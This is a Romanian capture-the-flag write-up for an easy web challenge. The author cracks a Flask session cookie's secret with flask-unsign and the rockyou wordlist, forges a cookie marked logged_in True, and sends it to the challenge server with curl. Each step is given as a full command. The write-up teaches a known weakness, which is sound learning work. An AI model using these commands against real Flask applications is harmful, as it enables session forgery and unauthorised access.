# Write-up: Web-intro 

<img width="817" height="167" alt="image" src="https://github.com/user-attachments/assets/75b5a622-cb3e-4ff2-a660-22cd5da83cc6" />


![Author](https://img.shields.io/badge/Author-Lucian_Ioan_Nitescu-red?style=for-the-badge)

![Category](https://img.shields.io/badge/Category-Web%20Exploitation-orange?style=for-the-badge&logo=kalilinux)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge)

![Points](https://img.shields.io/badge/Points-182-success?style=for-the-badge)

![Status](https://img.shields.io/badge/Status-SOLVED-brightgreen?style=for-the-badge)          

# Cand accesam Ip-ul intampinam o pagina care contine mesajul "Access Denied" .

<img width="613" height="120" alt="image" src="https://github.com/user-attachments/assets/3f72822b-a6da-4bb2-9772-9829e85e7005" />

## Explorand pagina gasim faptul ca aceasta detine un cookie.

<img width="1914" height="696" alt="image" src="https://github.com/user-attachments/assets/06ff2555-30b1-45d3-857b-655db4b487e4" />

## Am verificat cooki-ul pe `jwt.io` si am aflam faputl ca acesta este semnat cu "{"logged_in": false}" .

<img width="1491" height="470" alt="image" src="https://github.com/user-attachments/assets/74a12656-d8c4-4242-9a07-9dcf33b7b465" />

## Pentru a afla parola cu care este semanta cooki-ul am folosti `flask-unsign` pentru a "sparge" parola cu rockyou

```python
flask-unsign --unsign --cookie eyJsb2dnZWRfaW4iOmZhbHNlfQ.aihHMA.Wc3FE-P5IrPpZ3t8V_WIp7bATS0 --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

<img width="1268" height="93" alt="image" src="https://github.com/user-attachments/assets/b10c1ce2-18f0-490f-970e-39961359faf4" />

## Dupa aflarea parolei putem semna un nou cookie cu parola respectiva

```python
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'
```

<img width="603" height="54" alt="image" src="https://github.com/user-attachments/assets/62ff6260-a6b9-4d90-8a5d-6b670c5fa23c" />


## Obtinera acestuia ne va permite sa trimitem un req catre server cu noul cookie:

```
curl -v http://34.159.220.97:32570/ --cookie session=eyJsb2dnZWRfaW4iOnRydWV9.aihL3A.qJnZje-aYglRYqGl5YGgstRDut8
```

<img width="982" height="398" alt="image" src="https://github.com/user-attachments/assets/449846eb-9456-482e-8b29-7523bd87e5ad" />








